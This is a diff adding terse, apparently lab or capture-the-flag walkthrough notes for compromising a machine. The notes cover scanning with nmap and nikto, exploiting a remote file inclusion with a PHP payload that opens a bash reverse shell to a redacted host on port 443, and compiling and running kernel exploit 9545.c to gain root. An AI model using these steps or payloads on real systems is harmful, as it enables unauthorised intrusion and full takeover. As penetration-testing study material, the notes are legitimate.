@@ -1,0 +1,34 @@
+Scan with nmap. Run nikto. Nikto points out <redacted>
+
+<redacted> says leave <redacted> alone.
+
+Go to <redacted_file_name> and I see <redacted_service>
+
+Searchsploit <redacted> see rfi vulnerability.
+
+Use rfi to execute
+<?php echo shell_exec("bash -i >& /dev/tcp/<redacted>/443 0>&1");?>
+Port was very very important. Egress fw.
+
+From there I have low privilege apache shell.
+Find writeable directory in /var/tmp/
+
+mkdir test
+ Uname -a
+
+Searchsploit for kernel privilege escalation.
+
+Use 9545.c compiled on kali machine..
+
+Need special flags.
+
+gcc -m32 -Wl,--hash-style=both 9545.c -o 9545
+
+wget to victim
+
+Chmod +x 
+
+./9545
+
+h-3.00# whoami
+root
